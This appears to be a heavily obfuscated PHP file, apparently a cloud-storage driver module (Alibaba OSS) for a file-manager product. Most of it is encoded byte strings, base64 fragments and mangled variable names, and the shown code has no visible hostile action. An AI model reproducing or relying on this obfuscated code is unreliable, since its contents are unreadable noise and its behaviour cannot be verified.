0–†F!EX¼×('."\r".'')."\352\40\173\255\77\30\15\200\35\44\52\212\217\376\40\321\163\270\142\342\125\363\50\277\261\356\222\271\371\247\251\347\5\57\120\310\24\24\14\256\207\137\114\145\252\27"."\224\226\217\301\314\2\66\125\255\26\252\316\40\24\57\122\302\107\101\40\275\240\216\275\143\331\355\64\105\60\67\365\144\272\76\152\141\252\202\201\260\24\20\225\311\162"."\102\260\353\224\350\227\221\22\62\153\165\341\4\46\112\72\12\57\163\3\336\47\252\360\366\147\24\303\140\347\1\210\27\240\101\63\305\157\322\212\236\252\32\33\50\256"."\xf2\x59\x33\xac\xa4\xc9\x49\x5c\x63\xc\x19\xc9\xf2\x8b\x21\xc\x71\x86\x60\x3c\x8b\xf4\x7a\x1c\xdf\xd8\x89\x98\xad\x20\xa9\xc9\xcf\x3a\x2e\xe4\xe2\xc0\x0\xf7\x49\x5\x55\x6a\xbc\xce"."\156\312\257\362\116\216\250\71\273\202\55\253\265\53\172\106\105\272\302\116\156\7\317\322\205\322\350\222\201\366\143\310\315\147\301\27\332\331\310\72\253\150\146\352\211\20".base64_decode('TRiJcW3MuBsMKSor2CMjWkKq1YlWf7ytcaamtcrZ4Yi2QFXING0MdrYFgtTVDg==').strrev('€ü›F—ÀŞBzN|˜4Î/gx*ÅÁ»ºNåòeĞLF‹º>Hä=c…Ãõ').base64_decode('9y2M8ApaQFHA6QrDJEBbqf8JQGYhaQtoPWzxAtJF/K5YFrA/SMq6FGjHj6274Q==')."\275\13\126\20\173\30\371\357\205\72\4\27\146\243\254\315\242\345\274\44\43\373\240\216\144\213\377\376\301\220\302\71\156\120\14\135\233\370\257\205\270\63\75\364\45\124".base64_decode('SKBbtjJoAmEzdDLWKZLMHUYAYglEiRawvQZDi0j3jYiF/tFSZLUiFaIbXS4jrA==')."\xc3\x2c\xa4\x62\x75\x22\x54\x11\x76\x64\x29\x20\x81\x2c\x44\x8f\xdd\x88\x3b\x13\xae\xa5\xf7\xe0\x9f\x45\x99\x84\x13\x34\x9c\x1c\xa7\x25\x14\x93\xb9\x91\x80\xab\xcc\x23\x38\xb9\x10\xae"."\xe6\x65\x18\x81\x1a\x14\x3c\x3d\xc9\x3\xa\xbc\x25\x41\xf9\xf3\x82\x83\x4a\xd2\x95\xc2\xce\x31\xbf\x21\xd6\x93\xac\x79\xc1\xc6\x68\x38\xd8\x11\xa2\xea\x3c\x18\x47\x77\xb2\x42\x3e\xef".base64_decode('IqZlY9AmzwI7BK6BiKe5KJiJUhCOmJVoKAglSl+gyVYg3MKcbllh0YC/bV7RhA==')."\x48\x30\xda\x2a\x14\xc1\x40\x7f\xc4\xd7\x6a\x87\x59\x6b\x8\xfb\xe0\xfa\xe5\xf1\x86\x40\xd0\x2b\x24\xfb\x83\x85\x98\x0\x1c\x92\xd\x88\x5\x53\xc\x4\x1c\x76\xd7\x52\xc4\xa1\xd4\x2"."\x46\x25\xb1\xc\xf2\xb4\xce\x28\x60\x89\xeb\xbb\x96\x97\x97\x75\xb9\xeb\x5d\x15\x4c\x22\xc3\xf4\x44\xb8\xbd\x35\xa\xd8\xa0\x74\xbf\xd6\xe\x80\x5b\x6\x5\xe2\x62\x24\xe6\x76\xb9\xc8"."\x47\x58\x0\xc8\x8c\xcc\x77\x9\x25\xa3\xc4\xd3\x61\x18\x7b\x79\xb0\xb4\xc2\x76\xd5\x9a\xde\xfa\x74\xd9\x1d\x83\xf9\xb1\x52\x3d\x1a\x5e\x14\x66\xd8\xc6\x53\xb1\x58\xba\x65\x7e\xe1\x6c".base64_decode('4kmXLTP42y5mhUexRTNaJqjlDpwIcqkaXwt80Sa0eB46kuAY59sMALn4FkvXHQ==')."\x53\x1e\x90\x4d\xc6\x29\xfa\x84\x84\x38\x15\xb9\x85\x44\xcc\xb6\x63\x10\x0\x3f\x95\x11\xf6\x15\xe\xac\xa6\x6\x8\x8b\x9c\x19\x67\xa2\x2b\xd2\xc\x5d\x5b\x75\x9d\xce\x1a\xa8\xea\x82".base64_decode('bynAVyZU4W6pHKeMQT7exy5qQpJlOAdVioKJzA0FOQKOysjjSlS0Qeh3GmpP1g==')."\x29\xa7\x7b\x34\xc0\x24\xa4\x32\x14\x2a\xf7\x59\xd2\xb9\x9f\xb3\x9c\x96\x56\xa9\xbb\x99\x7e\x27\xf8\x84\x90\x86\x33\x83\xca\x29\xe1\x87\xa7\x39\xcc\x47\x1c\x8c\x18\x2c\x26\xce\xb\x44"."\x1a\xd9\x49\x25\x24\xc0\x2d\xb6\x69\xc8\x80\xcc\x83\x5d\x18\x75\xa2\x56\x9a\x4a\xdc\x32\x36\x1\x6e\x4d\xb8\x4e\x44\x1d\xed\xf1\x5b\xc6\x70\xbf\x47\x9e\x8\x71\xd4\x21\x71\x27\xaf\x54"."\x14\x2d\xce\x8c\x40\x9\x48\xb8\x1f\x45\x89\x46\xa6\x8f\x1f\xf2\x65\xfa\xd8\x19\x55\xdc\xb2\x89\xc2\xfd\x8a\xc7\x74\x61\x9f\x24\x1e\x55\x41\x5a\xc3\x30\x3d\x72\x26\xb7\x99\x1a\x86\xe1".base64_decode('RlfAscErv6JTWk9neKqzpdXjdQLSV00NtcAG1BUBOxCdS/KgMZXyxRgyebqUAg==').strrev('ì0k2SÈCŒö8ãÃÎ@ÁäÛPÁã”yg€–¼€ÌÄCë«DÜĞ¤“\'È').base64_decode('++7Cot9dWOy7C23fXVj4XQyyTVI5l/NiV6siNbGA4mKEUtwkPKkUTzyJZIoNkA==')."\134\40\271\21\63\177\11\226\337\340\41\266\20\222\302\22\261\124\347\42\244\51\101\11\274\101\11\174\132\66\114\310\31\377\137\70\52\204\27\243\133\31\273\316\170\54"."\267\146\30\156\350\224\11\161\226\354\220\77\30\246\252\70\153\237\260\7\163\101\72\44\36\143\230\317\74\346\121\217\273\335\303\32\24\34\366\61\357\1\200\101\366\364".base64_decode('wPvegLQRrPiGcpqhiB4gEwpyEsYuUwruEjPyECQ+1PZBcJxIfQqKHpogwpwZiw==')."\xe3\xd6\x21\x27\xe8\xba\xcd\xd1\xa0\xa1\x28\x7d\x54\x10\x12\x98\x65\x26\xbc\xb6\x33\x7\x82\xf6\xee\x40\x52\xc0\xe9\xa0\xce\xdc\x4d\x62\xd\xbb\xb3\x28\xc0\x29\x5c\x4f\xc6\xd4\x40\x70"."\77\12\332\105\252\206\315\44\353\67\205\160\103\5\136\374\163\172\261\136\73\165\356\343\21\214\45\166\14\74\117\31\246\336\22\155\53\300\346\140\261\253\271\253\265\53"."\42\242\311\324\345\144\22\64\133\360\331\146\151\313\217\271\200\44\172\244\323\212\72\175\44\211\210\3\166\203\34\320\313\310\140\224\315\116\344\23\274\310\374\234\17\341".strrev('[fZ[«dĞm“Ğ	Qs.ƒÄ˜ ,”›Ïbà(q+™Üç§8/.Pa¹&†d').base64_decode('SW3JxDLwW17iKIGMEorDkYIA1I6S2ollKFBObuePEDNlwQUdP7cgom29bJqCxg==')."\xad\x1e\x61\x3\xae\xef\x6a\x77\xb5\x7b\x90\xac\xf9\xfa\x7e\xf8\x45\xee\x2\xdb\x4e\xe7\x87\xa2\x80\xb4\x51\xd\x54\x54\x24\xb0\x84\x74\x13\xac\x8b\x29\x2d\xac\x25\x94\xf4\xb6\x36\x4e"."\xa3\x94\xd2\xd3\x7a\xba\x93\x3b\x85\x9c\x5d\x3f\x94\x49\x4b\x44\xea\xa9\x2b\xad\x72\x55\x96\x4a\xd4\x83\x7a\x5d\x69\x47\xa4\xc9\x39\xb3\xb4\x7e\xce\xe1\xb3\xbd\x48\xff\x6e\x2a\xad\x50".base64_decode('gQ4dbmJhdA5RmM2GS4hF3NbYaGUJJcrII1oWbGeACmVccYLMDkapuJ/OrGIOag==')."\72\71\134\40\104\264\272\162\252\70\157\311\24\61\350\362\105\327\222\153\241\256\214\166\277\43\67\234\317\72\241\110\354\14\213\316\211\154\176\201\53\255\371\241\120\153".strrev('µÍì•¨½’˜Ü“%N ¤e À…~¨ò¼}÷	Ñà·¹Ñ%kœ~Ä\'8¿’/Í')."\265\27\242\332\11\170\51\70\377\301\242\2\133\254\251\24\313\142\365\40\155\367\53\155\307\2\52\2\7\327\51\72\254\36\2\214\64\114\206\256\156\235\160\174\235\152"."\142\264\24\276\250\213\66\65\116\246\112\261\54\35\171\65\141\377\44\72\317\161\346\363\364\203\105\53\25\331\174\232\1\165\302\317\352\263\60\334\100\100\167\62\36\333"."\xce\xb3\xb\x3a\xcc\x42\x67\xb1\x60\xf1\x4a\xd5\x53\x6a\xa7\xd5\xd4\xd2\x3b\x16\xa7\xd1\xe3\xa8\x7c\xce\xac\x63\x41\xea\x4c\x76\xbc\x3b\x49\xe9\x0\x77\x37\x4d\xfb\x6\x7\xdc\xe2\x41"."\127\0\163\64\262\25\116\11\210\45\37\157\255\305\131\71\351\50\226\37\5\277\301\110\331\212\127\22\74\237\215\62\77\314\105\50\151\102\41\266\374\52\275\215\40\130".base64_decode('rLEB6aEBneWX+RKJpft4T2LQFo/M8D7QUI2zUmhbFTSb8VQ+21cnJEqmpkkZOQ==')."\73\114\230\374\111\106\355\44\143\26\374\120\335\44\327\324\244\1\42\204\136\63\167\172\160\37\341\156\251\260\373\7\222\202\125\313\56\350\344\334\5\67\251\120\136\170"."\xb6\xc1\x6a\xaf\x1a\x5\x7b\x93\xed\x7c\x40\x7c\xe\xa6\x3d\x9d\x67\x1e\xb1\x73\x28\x4c\xba\xd4\x1e\xe8\x68\xf6\xb7\x9\x67\xd0\x2\x20\xea\x6d\x6c\x8b\x7a\xda\xdb\x8b\x26\x30\x2e\x6"."\152\270\340\311\215\253\227\76\372\20\247\323\160\266\232\351\221\342\320\370\264\256\4\102\113\44\103\217\123\57\204\45\156\102\170\121\6\56\107\315\126\111\221\122\130\104"."\112\202\76\71\121\10\47\227\316\231\355\126\347\260\321\341\256\60\164\215\333\326\272\334\23\240\124\345\206\307\273\331\323\340\164\20\117\233\20\264\211\73\276\220\244\331"."\xb2\x84\x11\x5f\x57\xa\xcf\xde\x92\xa5\x52\xa\x6c\xe0\xcc\x80\x65\x8e\xbd\x70\x1b\x3d\xdc\x98\xed\x96\xc5\x44\xb8\x14\x43\x1a\xe5\x89\x99\x64\x35\xc0\xb4\xcc\x45\xd5\xe7\x9e\xb8\xcd".base64_decode('lbVXzi4oLAIrd8XFJDySyPq3ML8baQTcXIi0nicwFXyRSeFi70bk5HgfnIJ8vw==')."\x20\xdf\x24\x9\xed\x50\x6e\xc1\x9\x16\x7\xcc\xa6\x70\x9e\x6\x9a\xd\x3e\xa\xe5\x56\x9d\xfb\x95\x5f\xba\x14\x57\x4\x59\x84\xe5\xcb\xb\x61\xc4\xc\xc7\x9e\xe4\xc9\xa9\x76\x10\x9c".base64_decode('OXYYFL05DGx81s/gWStm4hCaB//yMoG2Zh7BS8uSuJhavKFY1+JSV8Xy5W6Vng==').base64_decode('Y3eVWMu6WG4c73JZ84OeENSzjARgz4kZzl+TxXe4u4Lb+rPzagkeYtfVzVnMDg==')."\x25\xba\x69\x1a\xe5\x1a\xd5\xaa\x99\x74\xf8\x47\x52\xce\x48\x27\xb\x7a\xdb\x38\x5f\xcc\x26\x39\xa6\x27\x2e\xa4\x36\xf1\x58\x1d\x22\xd6\xf\x30\xff\xe7\xa2\x9\x2d\xe\x7b\x72\x39\x31"."\112\237\1\100\12\362\264\32\163\263\325\216\225\346\256\70\67\172\247\131\20\255\261\301\341\141\263\55\1\32\74\43\360\0\240\236\200\115\353\265\303\101\135\14\310\2"."\263\215\270\256\346\114\13\235\302\357\35\225\40\217\365\275\362\200\214\263\224\110\364\375\224\22\344\237\267\4\320\45\234\102\10\2\157\312\154\110\200\44\135\111\327\225".base64_decode('oOYaKUUB5RGJKfYRULBEotQxIzOM6aYGdkpmSU3eiugIEVtVTxs5lCA82IQz8A==')."\357\304\11\154\77\200\217\223\244\25\35\33\344\41\252\203\216\251\222\134\267\105\236\256\150\17\5\43\101\57\365\376\137\114\11\66\225\62\274\6\276\57\300\5\43\152".strrev('S ©nEëÀïºòo*pCáÏ¶Jy'."\0".'fY³ç¯Ã!n±ƒšÈ·Ï=,')."\54\45\341\262\104\212\144\303\247\363\260\22\272\6\54\212\14\134\175\132\243\316\270\252\53\53\53\235\225\125\340\177\166\376\110\230\262\132\172\365\125\310\122\131\131\213"."\376\307\11\110\375\112\260\150\115\1\213\226\122\33\222\141\120\121\110\203\10\51\317\250\331\74\345\233\26\173\241\321\272\4\233\326\115\131\5\332\176\200\100\164\43\212"."\x2e\xfc\x59\x82\xb4\x37\x4b\x42\xe7\x5b\x24\xa6\xd8\x91\xc0\xe\xe\xc9\x90\xd0\x1d\x14\xae\x74\x1a\x6\xec\xb\x18\x1e\x84\x14\xd2\x5e\x76\x77\x2\x64\xe3\x3\x3f\xb\xdf\x46\xa9\x63".base64_decode('jfJlE4vFj7kocjGQ+/R00gSn6N6ZFMIknRtRWJoGyoCNNM56BQGCmgNdFmP3BA==')."\120\54\315\256\20\302\150\33\313\212\235\202\343\313\17\4\45\105\46\130\112\33\214\362\315\20\106\177\315\142\10\103\120\310\241\263\52\101\144\264\131\4\115\224\54\322".base64_decode('WURPscmhOLo016emLdeYokLdInJmwYyi4QdYNB7m/RzQJsgo0ymANfJ1HO0uPg==')."\171\220\157\116\364\356\22\266\255\251\75\274\140\164\114\373\310\40\264\353\32\277\223\124\360\200\31\215\11\67\365\250\346\72\374\137\114\70\50\304\107\1\330\350\301\313"."\xdc\x7b\x9\x15\xd8\x93\x6c\x65\x3c\x9\xe1\x6d\x2d\x83\xfb\xf5\xf2\x32\x17\x7e\xa2\xb3\x2f\x7c\x48\x2c\x98\x12\x18\xc4\x6b\x2e\x3f\x15\xa6\x75\xc\x8\x82\x8a\x2b\xa7\x6b\x3d\x60\xb0"."\14\261\257\0\336\136\34\314\262\27\346\54\222\211\165\110\314\47\2\241\365\22\175\346\211\314\73\176\327\111\346\17\320\11\131\371\155\30\1\150\265\44\22\22\274\354".base64_decode('qQERCAUf0Q4AGShZ64ACihXCWvYjc4VKwiZ5Eky4p0aycUoAtRSivlTVqIkBxA==')."\x6\x3f\xee\xb3\xc2\x31\xc\xcb\xa5\x71\xd1\x8b\x67\x4\x19\x54\xa5\x15\xfa\x1a\x19\x21\x37\x68\xde\xc3\xa\x90\x29\x86\xd\x81\x7c\xae\x92\xc5\x56\x57\x27\x16\xb3\xa6\xbd\xb7\x62\xd"."\15\134\106\163\101\24\62\265\232\250\123\206\350\213\212\52\3\270\350\132\330\43\130\105\46\235\165\142\25\314\40\244\161\206\25\324\62\372\44\304\200\370\103\71\244\4".base64_decode('bW9/XqFcnUDMJJOTMkJ4IildM03xxq4nIVDggLinR3AR5xz+HcsRlOCBk2UFew==').base64_decode('Cf26TPcXZPfjQi6PuRBii9ptg9DuYFL6T12XZtlDFXA4w4JpRpEvkEKsCNmkdA==').base64_decode('Ja7pSBoV7llmzZDSI0YDGpPC4ZGHUqQKeL9cmOJwFgD5MC/eVhc8n4KY4GpWYA==')."\x36\x9c\x55\x12\xe3\x52\xa2\xb8\x66\x1c\x99\x2c\x24\xa0\xfc\xc5\x18\x16\x9b\xf2\x48\xb0\xd1\x44\xe2\x6f\x38\x1f\x63\x7a\x7a\x1b\x1b\x41\xcd\x3e\x25\x71\x97\xa6\x76\x9c\xb0\x2\x74\xc3".base64_decode('GfbAENNAtdDXIu+ZWAR9s6AIToM7Kzf4FFMMIC9BVI2eUuRTKEnAaJw5ISDY4Q==').base64_decode('SCIJwwo1/3JWVTupFwvRFpRsvgS/kL8VpgHkwikdJLZcJB/PowmPYaHbwPziIw==')."\272\370\314\306\23\335\220\146\61\135\330\267\24\146\347\205\256\12\213\144\205\237\103\143\363\57\230\241\243\130\72\306\20\114\156\264\130\307\331\62\200\225\141\115\47\56"."\x6c\x33\x96\xc7\x4d\xc1\x3c\xb0\x98\x58\xd8\x2a\x21\x2e\x8b\x45\x37\xbd\xa8\x14\xef\x7\x37\x34\x4\x20\xd\x3b\xca\x15\x10\xc3\xcf\xd3\xf1\x25\x6a\x6a\x21\xc9\xe8\x12\x7\x47\x34\x6"."\x2c\x3c\x93\x77\x31\xb\x51\x72\x25\x86\xbc\x3a\x55\x56\xe\xaf\xc4\x58\x74\x1e\xad\xc3\xec\x6a\x3\x18\xc9\x3e\xb8\x49\x30\x33\x3d\x43\x8c\xd0\x54\x36\x39\xd\x4b\x4\x9b\xb5\x58\x4a"."\x33\x10\xcb\x35\xa8\x90\xdb\x2d\x4c\x36\x6f\x6f\x69\x77\x33\x50\x3\x45\x13\xbb\xa4\x4a\x4\x3b\xfe\x8e\x11\x31\xf8\x22\xd7\x4b\x6\x1\xde\xb5\x41\xb2\xc0\xbc\xb5\xcc\xd2\x87\x3e\x96"."\72\230\121\343\122\40\330\354\367\172\2\215\376\360\74\11\172\115\340\326\6\310\55\265\165\271\43\165\25\36\34\72\363\143\314\63\63\14\72\143\200\361\164\46\30\73"."\156\160\306\133\60\0\22\36\136\260\126\213\347\250\242\27\324\10\330\370\214\225\40\240\62\120\11\127\44\167\232\353\244\204\314\71\135\51\314\77\254\240\27\117\171\213"."\205\2\371\42\255\41\371\213\177\1\54\21\153\156\260\131\53\331\321\32\257\146\7\124\103\345\304\201\226\30\26\153\347\152\106\235\71\7\117\210\276\304\205\21\340\310"."\306\137\51\164\341\101\234\63\210\216\161\155\142\63\36\46\321\327\113\216\152\331\311\363\75\334\75\75\212\12\17\7\344\164\131\65\24\1\200\75\330\127\224\323\230\340"."\0\206\224\216\342\62\30\26\202\57\200\376\257\53\127\23\334\7\204\255\151\152\202\236\310\63\173\176\354\124\331\53\276\100\104\233\120\360\272\301\177\175\47\301\301\365".base64_decode('9FF0U54+PoKeQSanJuxEOopv4PNPAMFMH86JJzvuBHXuTgVF6H7GRzW2MMK5XA==')."\230\235\324\6\77\207\345\34\40\165\301\43\16\312\17\123\165\11\130\320\4\355\226\223\115\333\213\17\166\3\76\313\263\237\5\337\200\46\125\243\327\3\312\111\134\227"."\300\62\110\165\122\45\122\121\361\107\100\244\331\364\76\21\377\4\162\71\341\313\344\114\213\50\327\42\32\340\12\50\306\0\304\175\160\366\35\232\207\150\231\341\2\200"."\105\245\20\240\355\142\46\144\320\101\167\66\251\211\150\100\4\20\354\43\370\65\33\150\126\215\103\130\170\164\0\106\134\61\13\75\376\343\172\106\255\324\260\157\41\234"."\235\201\357\20\244\264\101\353\3\65\20\142\177\171\200\275\71\140\371\26\114\21\46\63\272\125\52\76\231\100\235\325\3\266\321\362\336\204\120\373\44\374\323\105\176\51".strrev('J8Òy='."\n".'S	¦‹Ëá¢Àu½ŒØ}2ö§‚•ypªĞrå¯{9Ji5×W·•')."\121\33\130\262\372\153\347\156\360\371\16\144\165\135\316\316\351\230\345\26\262\240\23\35\321\107\264\210\334\343\300\274\17\244\100\74\326\60\54\206\105\143\105\324\151\220".base64_decode('SDUrCTYD5ggZ6JsxCQd60ATTIfujOcL6YcRNLN2T1mJyOoSNfywW9TqQW5hBnw==').base64_decode('JRsGueVcbtRjAcKP4COCfNaP729ZoLogF4nmovgwhF9SIdnB19rx6QfptlglPQ==').base64_decode('kWJqwibh1Ut34QkWNE6i7I1gu0cOE12i4EIySLMlPsCWBQonBFz1KIBWvcjo/g==')."\x8\x94\xcd\x43\xeb\xb3\x4a\x78\xc2\xa2\x9f\x46\x25\xc9\xb8\x7e\x18\xe7\x32\xa1\x78\x6b\x95\x1f\x75\xdb\x9f\x72\xa1\x9f\x61\xef\xd2\x38\x70\xcf\xf8\xa3\x5a\xf8\x15\x1a\x7\x7b\x71\xc6".base64_decode('gT0IOcg7Mw5+2ejHXmbij9lZX8CDbWbGbgXst53zZqiyFQjZERfRCvVx/Nwumw==')._kodDe('LuC/QIOhABI6DfVqBseI/sNaZJDZSj7YXK3QNwL4lu/+DWvWyHkB+QfFG42Zww0=')."\xe9\xc9\x8f\x3d\x9b\x6a\x99\x75\x40\xa8\xe7\x46\xf7\xd8\x9f\x55\xc1\x63\x10\x8b\x32\x89\xea\x29\xd3\x6a\x44\x31\x9e\x8f\xf\x3f\x51\x21\x7e\x5\x89\x2b\x33\x72\xac\x43\x76\x74\x3e\xf0".base64_decode('knVaSdSXlrh8UaLVKrXwXSgbIf7fLQDOCuOsgo1o4SNxBYhAc1GwrBC2MdupuA==').base64_decode('Bg+rDb6K8MbFX4Oyfgu/XVakH8L2wxcEfoxHS0OhMgMVo6YuW6WjYkIAwgSVOA==')._kodDe('LuREkzBfUjIrQfzgDzFUADokW6sl8953BgPLrUKj9aJZssmEq1lshPlv1XAhAEQ=')."\300\62\3\267\211\50\322\163\367\134\112\76\212\74\266\44\34\54\377\110\273\61\253\305\204\36\247\154\72\205\11\51\350\313\24\63\210\6\230\360\54\134\6\263\366\325"."\x56\x3d\x28\xc6\xeb\xe8\x76\x48\xa3\x65\x2a\xe4\xbd\x84\x37\x99\xb8\x9f\x9\x81\xd1\x82\xa5\xe9\xa5\xad\x51\x44\x58\x4a\xa3\xc4\xd7\xa6\xcc\x14\x67\xf1\xf1\xa\xb5\xac\x56\xc1\x43\x9d"."\170\213\5\125\44\56\203\302\252\221\126\204\264\227\54\327\226\110\244\35\137\124\362\64\263\313\113\262\140\262\2\121\47\74\266\246\211\141\353\315\340\40\365\344\5\130"."\43\213\170\5\342\215\266\367\370\20\311\261\77\322\107\373\217\326\71\247\144\302\55\70\213\20\300\336\160\261\10\5\206\375\61\43\300\104\211\216\371\100\224\315\160\262"."\x65\x12\x5a\x87\xcc\x87\xf1\xd7\x1c\xf6\x27\x1a\x73\xc2\x25\x60\xdb\xe3\xb1\x82\x82\xd2\xfa\x2c\xac\xe5\xb2\x20\xf4\x88\x60\x5b\xd6\xf4\xa\xa2\x61\x7b\x6e\xc\xfb\x49\xc3\x61\xca\x7f"."\377\77\77\331\370\377\353\245\306\151\225\124\225\154\171\316\257\231\260\265\224\7\33\21\334\62\142\65\246\255\37\326\215\161\254\230\112\146\250\303\22\43\21\276\340\340".strrev('ÕffòeÊ>L´İ_'."\n".'EŠºW±öF`gãÁm[æ9cÓ!¬uƒÔ”öbë½²ã')."\x78\x5f\x91\xc3\x3b\x38\x4\x1\xab\x13\x43\x81\x37\x28\xc8\xc6\xe9\x13\x60\x21\xa8\xcf\x10\x37\xd\xc5\xa1\x70\x5\x19\x48\x4a\x16\xc5\x3b\x6e\xc1\x1c\x15\xc3\xca\x9\x25\xee\x9e\x4b"."\xc9\x7\xba\x35\x4b\xa8\x88\x48\x39\x2c\xa0\x2\x7a\x13\xb1\xec\x82\x16\xa0\x88\x1e\xfe\x54\xad\xcb\xfa\x58\x2a\x29\xd1\x6a\x7b\x84\xa\x67\x32\x44\xdc\x5a\x74\xc8\x85\x67\xb9\x85\xa5".base64_decode('2WIWi0D7Uqsmhr3QWWl/srPKWfgxbN4NtQghKOfTCYmOGdAxYJEyeFmGeZ5Rpg==').base64_decode('f/FFyN5XFcRfEBL7Sxdzu64hBswKZboMwVJPeC6y4ME3m7oeCEX8/ErVkJNS0g==')."\xed\x70\x47\x6b\x19\xba\xa1\x40\x66\x2a\xe0\xe9\x85\xb7\xa0\xcd\x4c\xe\xeb\xb8\xc4\x3d\x94\x5e\xff\x11\x2c\x6b\x9\xc8\xa2\x89\x32\x44\xd7\xcb\xd6\x92\xd0\x56\xda\xba\x52\xe6\x14\xcb".base64_decode('Ftd0Q8jG4MXywjf1TAs2uedYu8dYJABjmdYi2pLDQhEknKUB9jZh9QONEhGY+g==')."\241\242\17\204\363\323\40\353\141\34\163\216\131\100\251\362\152\100\110\106\245\250\123\23\360\13\257\101\371\371\275\160\224\214\165\330\236\1\331\244\107\132\366\122\326\247"."\67\205\243\273\70\232\73\276\302\323\31\176\150\44\154\376\264\30\24\101\70\255\265\301\5\342\317\251\235\74\300\17\144\70\367\233\110\260\207\137\55\131\23\224\377\147"."\x50\x0\xe1\x6f\xc4\x42\x5e\x47\xb8\x59\xc9\x6d\x73\x95\x41\xfb\xcb\x7d\x2e\xf1\x36\xa6\x25\x63\x21\x94\xdf\xbc\x14\xca\x73\xdd\x3c\xef\x26\x84\x15\xeb\x3e\x5a\x32\xd6\xe2\xe2\xcd\x4e".strrev('–ÜmĞEÔ²m@´àº f66YH÷­\'ù“'."\n".'îµ¹Ò¤‚-Ff;8©6')."\144\210\157\332\132\117\344\104\161\136\230\2\112\72\40\124\47\236\326\215\132\40\134\374\43\174\126\132\121\54\334\271\345\11\164\263\322\54\310\27\210\35\353\30\311\31"."\22\23\55\315\261\17\55\142\373\371\364\305\300\14\122\167\272\250\372\270\60\277\142\153\275\130\300\336\63\134\302\30\124\315\170\112\220\105\12\23\13\341\172\1\122\311".strrev('ÂÓ$ËœY`'."\n".''."\n".';)i×—¡\'Z*-Á”ŠÑäph)+Æ„»SŠ*Ş×·Š‡')."\202\102\103\50\147\312\171\143\224\356\25\42\217\110\371\211\42\35\266\311\302\70\353\150\370\54\232\271\360\163\144\306\331\163\43\265\100\361\126\160\151\336\166\254\132\254"."\25\105\63\217\332\212\42\257\111\23\377\136\105\150\55\115\51\102\135\371\31\174\41\35\347\151\105\54\2\160\235\160\217\26\35\307\24\111\26\315\13\212\33\40\204\212"."\56\175\303\152\31\140\203\213\210\241\126\102\100\142\343\257\21\13\366\264\223\54\44\75\237\355\313\152\154\233\110\160\133\56\150\52\312\336\354\145\237\53\250\315\72\65"."\xb3\x79\xc1\xca\xb3\xa8\x79\xaf\x3\xbd\x51\x5f\x20\xc9\xa6\x65\xaa\x1f\x17\xec\xa2\xb1\xd4\xa2\x99\x6a\x5c\xb0\x4e\xe2\x36\xa2\xac\x9b\x2a\x67\xe3\xd3\x82\x2\xce\xa6\xfb\xe2\xd2\xbe".base64_decode('5YC6iHYIgQi7xlXNFitxvP8THTs+avPCk1Z2vALFKwfeL3FyWNNNB0yLaDn02w==')."\240\231\46\245\44\100\376\107\71\21\223\7\67\75\207\140\231\0\102\374\54\5\142\21\251\367\321\164\104\144\3\5\311\241\37\24\70\303\12\116\105\304\306\22\201\307"."\x6\x2c\x22\xee\x69\xe4\xa4\xae\x29\x6f\x3b\x6e\xe4\x0\x20\x44\xc6\xb4\x21\xea\xa5\xd\x5e\x57\xe5\xed\xe1\x4f\xfd\xca\x76\x46\x8e\xf3\x20\x64\xbe\x89\x76\x16\xe8\x52\xb0\xe1\xc6\x29"."\x6e\xe2\xf5\xd6\x89\xea\x70\x12\xff\x27\xbd\xb9\x1e\x4b\x71\xfc\x4\x0\xb3\x2f\xfc\xb1\x1a\x88\x6e\x92\x57\x81\xbd\x61\x22\xb5\x12\xf4\xb\xeb\x5b\xe8\xf\x47\xc2\x5\x49\xed\x9e\x70"."\xb8\x33\x18\x6a\xc4\xce\x33\xb\x92\x51\x29\xc1\xa4\xa5\x20\xa9\xbd\x25\xd8\x36\x5a\x9a\xaf\xd5\xe3\xf\x14\xa4\x41\x13\x97\xb6\x28\x77\xe3\x83\x93\xfc\xed\xa8\x95\x9e\x40\x20\xd8\x39"."\132\53\374\336\171\274\45\350\100\225\253\274\163\51\215\152\262\351\311\100\130\116\123\131\132\270\270\246\144\270\77\47\136\306\252\42\20\307\325\240\256\316\130\300\352\142"."\xde\x66\x6d\x46\x27\x2c\xa9\x8\x9a\xa7\xb4\x91\xba\x43\x39\x2\x85\xce\x44\xd9\xe2\x66\xcc\x32\xea\x90\x68\xd5\xc6\x8f\x8c\x5d\x96\x73\x66\x1\x8e\x16\xb\x22\x31\xc2\x24\x14\x77\x57"._kodDe('L5fzeRdAIEluvpeYNhILlJ/FrjB3nkMCBeTjZUemEPe49H0TihUL7rgQ9mjopws=').strrev(''."\0".''."\0".'Ÿ'), 10, -8))); goto Dåß¥«Š‘È; c¹Èª†ÀÆ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($cÄ„áŠãÙ) { parent::__construct($cÄ„áŠãÙ); $this->signatureVersion($_SERVER[ä°„ä°º][212]); } public function fileOutLink($AĞÔ‘İªÚª) { $añ…ïµİÌ =& $_SERVER[ä°„ä°º]; if (substr($AĞÔ‘İªÚª, 0, 7) == $añ…ïµİÌ[1225]) { $AĞÔ‘İªÚª = $añ…ïµİÌ[1226] . substr($AĞÔ‘İªÚª, 7); } header($añ…ïµİÌ[159] . $AĞÔ‘İªÚª); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($fµ¨ß­õ¶) { parent::__construct(); include_once SDK_DIR . $_SERVER[ä°„ä°º][1281]; $this->_init($fµ¨ß­õ¶); } public function _init($c®Ïñ‹—ÙÏ) { $Fö°ÏàÇïÎ =& $_SERVER[ä°„ä°º]; foreach ($c®Ïñ‹—ÙÏ as $b´é²Ê => $a˜‘òå„™) { if (isset($this->{$b´é²Ê})) { $this->{$b´é²Ê} = $a˜‘òå„™; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Fö°ÏàÇïÎ[1282] . LNG($Fö°ÏàÇïÎ[1283])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto A…ë ñˆ†…; A…ë ñˆ†…: $BîÁˆˆÎ­ =& $_SERVER[ä°„ä°º]; $Càé‹›Üˆ» = new OSS\Model\CorsConfig(); $dçÔõ—»  = new OSS\Model\CorsRule(); goto dãƒ°ƒÎç†; E¥°Ò®ó©¶: $dçÔõ—» ->addAllowedMethod($BîÁˆˆÎ­[1287]); $dçÔõ—» ->addAllowedMethod($BîÁˆˆÎ­[1288]); $dçÔõ—» 